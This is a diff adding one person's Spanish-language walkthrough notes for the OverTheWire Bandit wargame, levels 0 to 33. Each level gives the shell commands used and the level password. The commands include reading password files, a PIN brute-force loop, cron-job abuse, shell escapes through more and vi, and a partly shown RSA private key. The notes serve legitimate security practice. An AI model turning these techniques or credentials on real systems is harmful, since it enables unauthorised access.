@@ -1,0 +1,450 @@
+Bandido Nivel 0 -> Nivel 1
+Comandos: 
+ls *
+cat readme
+Password: NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
+
+Bandido Nivel 1 -> Nivel 2
+Comandos:
+ls *
+cat ./-
+Password: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
+
+Bandido Nivel 2 -> Nivel 3
+Comandos:
+ls -apls
+cat spaces\ in\ this\ filename
+Password: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
+
+Bandido Nivel 3 -> Nivel 4
+Comandos: 
+ls -alps
+cd inhere/
+ls -al
+cat .hidden
+Password: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
+
+Bandido Nivel 4 -> Nivel 5
+Comandos: 
+ls -alps
+cd inhere/
+ls
+find . -type f | xargs file
+cat ./-file07
+Password: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
+
+Bandido Nivel 5 -> Nivel 6
+Comandos:
+ls
+cd inhere
+find . -type f -size 1033c ! -executable
+cat ./maybehere07/.file2
+Password: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
+
+Bandido Nivel 6 -> Nivel 7
+Comandos:
+find / -type f -user bandit7 -group bandit6 -size 33c
+cat /var/lib/dpkg/info/bandit7.password
+Password: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
+
+Bandido Nivel 7 -> Nivel 8
+Comandos:
+ls -alps
+strings data.txt | grep "millionth"
+Password: TESKZC0XvTetK0S9xNwm25STk5iWrBvP
+
+Bandido Nivel 8 -> Nivel 9
+Comandos:
+cat data.txt
+sort data.txt
+sort data.txt | uniq -c
+Password: EN632PlfYiZbn3PhVK3XOGSlNInNE00t
+
+Bandido Nivel 9 -> Nivel 10
+Comandos:
+strings data.txt | grep "="
+Password: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
+
+Bandido Nivel 10 -> Nivel 11
+Comandos:
+cat data.txt
+base64 -d data.txt
+PASSWORD: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
+
+Bandido Nivel 11 -> Nivel 12
+Comandos:
+cat data.txt
+Se buscó en CyberChef:
+ROT13
+Se ingresó:
+Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi
+PASSWORD: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
+
+Bandido Nivel 12 -> Nivel 13
+Comandos:
+cd ~
+cat data.txt
+man xxd
+mkdir /tmp/example
+cp data.txt /tmp/example
+cd /tmp/example
+ls
+xxd -r data.txt > data
+ls
+file data
+man gzip
+mv data file.gz
+gzip -d file.gz
+ls
+file file
+mv file file.bz2
+ls
+file file
+mv file file.gz
+gzip -d file.gz
+ls
+file file
+mv file file.tar
+tar xf file.tar
+ls
+file data5.bin
+rm file.tar
+rm data.txt
+ls
+file data5.bin
+mv data5.bin data.tar
+tar xf data.tar
+ls
+file data6.bin
+mv data6.bin data.bz2
+bzip2 -d data bz2
+ls
+file data
+bzip2 -d data.bz2
+ls
+file data
+mv data data.tar
+ls
+tar xf data.tar
+ls
+file data8.bin
+mv data8.bin data.gz
+gzip -d data.gz
+ls
+file data
+cat data
+PASSWORD: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
+
+Bandido Nivel 13 -> Nivel 14
+Comandos:
+ls
+ssh -i sshkey.private bandit14@localhost
+cat /etc/bandit_pass/bandit14
+PASSWORD: 4wcYUJFwOKOXLShlDzztnTBHiqxU3b3e
+
+Bandido Nivel 14 -> Nivel 15
+Comandos:
+nc localhost 30000
+cat /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+nc localhost 30000
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+PASSWORD: BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+Bandido Nivel 15 -> Nivel 16
+Comandos:
+cat /etc/bandit_pass/bandit15
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+man nc | grep ssl
+man ncat
+man ncat | grep ssl
+ncat --ssl localhost 30001
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+PASSWORD:  cluFn7wTiGryunymYOu4RcffSxQluehd
+
+Bandido Nivel 16 -> Nivel 17
+Comandos:
+cat /etc/bandit_pass/bandit16
+cluFn7wTiGryunymYOu4RcffSxQluehd
+nmap localhost -p 31000-32000
+ncat --ssl localhost 31790
+cluFn7wTiGryunymYOu4RcffSxQluehd
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+...
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+exit
+vim key
+chmod 400 key
+ssh -i key bandit17@bandit.labs.overthewire.org -p 2220
+
+Bandido Nivel 17 -> Nivel 18
+Comandos:
+man diff
+diff passwords.old passwords.new
+42c42
+< hlbSBPAWJmL6WFDb06gpTx1pPButblOA
+---
+> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+exit
+ssh bandit18@bandit.labs.overthewire.org -p 2220
+PASSWORD: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+Bandido Nivel 18 -> Nivel 19
+Comandos:
+man ssh 
+man ssh | grep shell
+man ssh | grep terminal
+ssh -t bandit18@bandit.labs.overthewire.org -p 2220 /bin/sh
+ls
+cat readme
+PASSWORD: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+Bandido Nivel 19 -> Nivel 20
+Comandos:
+ls
+./bandit20-do
+./bandit20-do id
+./bandit20-do ls
+./bandit20-do cat /etc/bandit_pass/bandit20
+PASSWORD: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+Bandido Nivel 20 -> Nivel 21
+Comandos:
+ls
+./suconnect
+nmap -F localhost
+exit
+bash
+ssh bandit20@bandit.labs.overthewire.org -p 2220
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+cat /etc/bandit_pass/bandit20 | nc -l localhost -p 1234
+./suconnect 1234
+PASSWORD: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+Bandido Nivel 21 -> Nivel 22
+Comandos:
+cat /etc/cron.d/
+vim /etc/cron.d/
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+PASSWORD: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+Bandido Nivel 22 -> Nivel 23
+Comandos:
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+whoami
+$myname
+man md5sum
+echo I am user $myname | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+PASSWORD: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+Bandido Nivel 23 -> Nivel 24
+Comandos:
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+cat var/spool/
+vim test.sh
+ls
+cd /tmp/aiden
+ls
+rm data
+cd ..
+mkdir braynsahagun123456789
+cd braynsahagun123456789
+vim test.sh
+cat /etc/bandit_pass/bandit24 > /tmp/braynsahagun123456789
+ls
+chmod 777 test.sh
+vim test.sh
+cat /etc/bandit_pass/bandit24 > /tmp/braynsahagun123456789/pass
+touch pass
+chmod 777 pass
+ls
+cp test.sh /var/spool/bandit24/
+ls -alps
+cat pass
+cat pass
+cat test.sh
+cat pass
+cron
+cat pass
+cat pass
+PASSWORD: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Bandido Nivel 24 -> Nivel 25
+Comandos: 
+mkdir /tmp/youtube
+cd /tmp/youtube
+nc localhost 30002
+vim brute.sh
+#!/bin/bash
+bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+for pin in {0000..9999}; do
+echo "$bandit24 $pin" | nc localhost 30002
+done
+chmod 777 brute.sh
+./brute.sh
+im brute.sh
+vim brute.sh
+./brute.sh
+PASSWORD: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Bandido Nivel 25 -> Nivel 26
+Comandos:
+ls
+ssh -i bandit26.sshkey bandit26@localhost
+cat /etc/passwd | grep bandit26
+cat /etc/shells
+cat /usr/bin/showtext
+STERM
+cat /home/bandit26/text.txt
+showtext
+touch text.txt
+whatis more
+man more
+man ssh | grep terminal
+ssh -t -i bandit26.sshkey bandit26@localhost /bin/bash
+ssh -T -i bandit26.sshkey bandit26@localhost
+ssh -T -i bandit26.sshkey bandit26@localhost /bin/bash
+cat /usr/bin/showtext
+man more | grep exec
+man more | grep command
+ls
+more bandit26.sskey
+ls
+ssh -i bandit26.sshkey bandit26@localhost :
+more bandit26.sshkey
+man vi | grep exec
+more bandit26.sskey
+:e /etc/bandit_pass/bandit25
+ssh -t -i bandit26.sshkey bandit26@localhost
+ls -alpsh /home/bandit26/
+ssh -t -i bandit26.sshkey bandit26@localhost /bin/sh
+:e /etc/bandit_pass/bandit26
+PASSWORD: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+:set shell=/bin/bash
+:shell
+
+Bandido Nivel 26 -> Nivel 27
+Comandos:
+chsh
+ls
+./bandit27-do
+./bandit27-do cat /etc/bandit_pass/bandit27
+PASSWORD: 3ba3118a22e93127a4ed485be72ef5ea
+
+Bandido Nivel 27 -> Nivel 28
+Comandos:
+cat /etc/bandit_pass/bandit27
+touch test
+mkdir /tmp/braynsahaguntest
+mkdir /tmp/brayn123456789
+cd /tmp/brayn123456789
+git
+ssh://bandit27-git@localhost/home/bandit27-git/repo
+git clone 
+ls -al
+cd repo/
+ls -al
+cat README
+PASSWORD:0ef186ac70e04ea33b4c1853d2526fa2
+
+Bandido Nivel 28 -> Nivel 29
+Comandos:
+pass=0ef186ac70e04ea33b4c1853d2526fa2
+mkdir /tmp/brayn123
+cd /tmp/brayn123
+git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+ls -al
+cd repo/
+ls
+ls -al
+cat README.md
+git log
+git branch
+git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+cat README.md
+PASSWORD: bbc96594b4e001778eee9975372716b2
+
+Bandido Nivel 29 -> Nivel 30
+Comandos:
+ls
+pass=bbc96594b4e001778eee9975372716b2
+mkdir /tmp/brayn000
+cd /tmp/brayn000
+git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+ls -al
+cd repo
+ls
+ls -al
+cat README.md
+git brach
+git branch -r
+git checkout dev
+git log
+cat README.md
+PASSWORD: 5b90576bedb2cc04c86a9e924ce42faf
+
+Bandido Nivel 30 -> Nivel 31
+Comandos:
+shell=5b90576bedb2cc04c86a9e924ce42faf
+mkdir /tpm/brayn9090
+cd /tmp/brayn9090
+git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+5b90576bedb2cc04c86a9e924ce42faf
+cd repo/
+ls
+ls -al
+cat README.md
+git log
+git branch
+git branch -r
+cat README.md
+git tag
+git show tag
+git show secret
+PASSWORD: 47e603bb428404d265f59c42920d81e5
+
+Bandido Nivel 31 -> Nivel 32
+Comandos:
+shell=47e603bb428404d265f59c42920d81e5
+mkdir /tmp/brayn0101
+cd /tmp/brayn0101
+git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+47e603bb428404d265f59c42920d81e5
+ls
+cd repo
+ls -al
+cat .gitignore
+cat README.md
+git branch
+ls -al
+rm .gitignore
+echo "May I come in?" > key.txt
+cat key.txt
+git add key.txt
+git commit -m "Added key.txt"
+git push
+47e603bb428404d265f59c42920d81e5
+PASSWORD: 56a9bf19c63d650ce78e6ec0354ee45e
+
+Bandido Nivel 32 -> Nivel 33
+Comandos:
+$SHELL
+$EUID
+$0
+export SHELL=/bin/bash
+echo $SHELL
+$SHELL
+cat /etc/bandit_pass/bandit33
+PASSWORD: c9c3199ddf4121b10cf581a98d51caee
